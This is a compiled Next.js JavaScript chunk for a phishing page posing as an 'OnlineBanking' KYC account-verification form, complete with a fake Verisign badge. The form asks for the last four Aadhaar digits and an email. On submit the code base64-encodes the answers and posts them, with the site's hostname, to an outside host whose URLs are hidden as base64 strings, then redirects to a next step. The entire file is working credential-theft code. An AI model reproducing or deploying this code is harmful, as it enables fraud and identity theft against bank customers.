(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [923], {
        3618: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/i", function() {
                return n(2581)
            }])
        },
        9018: function(e, t, n) {
            "use strict";
            var a = n(1876).Buffer,
                s = {
                    dataList: a.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: a.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            t.Z = s
        },
        2581: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return $
                }
            });
            var a = n(7568),
                s = n(655),
                r = n(5893),
                i = n(9008),
                l = n.n(i),
                c = n(5675),
                o = n.n(c),
                u = n(7294),
                d = n(1163),
                m = n(9018),
                h = n(1876).Buffer;

            function $() {
                var e, t = (0, d.useRouter)(),
                    n = (0, u.useState)(""),
                    i = n[0],
                    c = n[1],
                    $ = function() {
                        var e = new Date,
                            t = e.getFullYear(),
                            n = e.getMonth() + 1,
                            a = e.getDate();
                        a < 10 && (a = "0" + a);
                        var s = e.getHours(),
                            r = e.getMinutes(),
                            i = s >= 12 ? "PM" : "AM";
                        s %= 12, s = s || 12, r = r < 10 ? "0" + r : r, c(a + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][n].substring(0, 3) + "-" + t + " [" + s + ":" + r + " " + i + " IST]")
                    },
                    f = (0, u.useState)(!1),
                    p = f[0],
                    x = f[1],
                    b = (e = (0, a.Z)(function(e) {
                        var n, a, r, i, l, c, o;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return e.preventDefault(), x(!0), n = new FormData(e.target), a = {}, n.forEach(function(e, t) {
                                        a[t] = e
                                    }), r = JSON.stringify(a), i = ((l = {}).method = "POST", l.headers = {
                                        "Content-Type": "text/plain"
                                    }, l.body = h.from(r, "utf-8").toString("base64"), l), [4, fetch(window.atob(m.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (c = s.sent()).json()];
                                case 2:
                                    return o = s.sent(), x(!1), !0 == o.status ? t.push("/j") : x(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    });
                return (0, u.useEffect)(function() {
                    return $
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(l(), {
                        children: [(0, r.jsx)("title", {
                            children: "Verify your account details online"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "verify your account details here online free"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(o(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: i
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Account Details"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: b,
                                children: [(0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Aadharnumber",
                                        children: [" Last 4 Digit Aadhar Number", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "Aadharnumber",
                                        type: "text",
                                        name: "Aadharnumber",
                                        required: !0,
                                        maxLength: 4,
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Email",
                                        children: ["Email", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "Email",
                                        type: "email",
                                        name: "Email",
                                        required: !0,
                                        title: "Please enter valid email",
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsx)("p", {
                                    className: "content_title",
                                    children: "80% KYC Successful"
                                }), (0, r.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!p,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(o(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, t, n) {
            "use strict";

            function a(e, t, n, a, s, r, i) {
                try {
                    var l = e[r](i),
                        c = l.value
                } catch (o) {
                    n(o);
                    return
                }
                l.done ? t(c) : Promise.resolve(c).then(a, s)
            }

            function s(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(s, r) {
                        var i = e.apply(t, n);

                        function l(e) {
                            a(i, s, r, l, c, "next", e)
                        }

                        function c(e) {
                            a(i, s, r, l, c, "throw", e)
                        }
                        l(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 876, 774, 888, 179], function() {
            return e(e.s = 3618)
        }), _N_E = e.O()
    }
]);